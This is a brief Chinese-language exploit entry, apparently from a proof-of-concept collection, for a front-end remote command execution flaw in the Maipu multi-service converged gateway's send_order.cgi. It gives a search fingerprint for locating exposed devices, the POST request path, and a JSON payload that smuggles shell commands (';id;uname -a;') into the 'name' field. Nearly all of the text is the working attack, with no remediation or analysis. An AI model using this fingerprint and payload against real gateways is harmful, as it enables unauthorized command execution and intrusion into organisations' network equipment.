# 迈普多业务融合网关send_order.cgi前台RCE漏洞

迈普多业务融合网关send_order.cgi前台 ｜ 命令执行 ｜ —
- **指纹**：`title=="迈普多业务融合网关"`
- **请求**：`POST /send_order.cgi?parameter=operation HTTP/1.1`

**Payload**
```
{"opid":"1","name":";id;uname -a;","type":"rest"}
```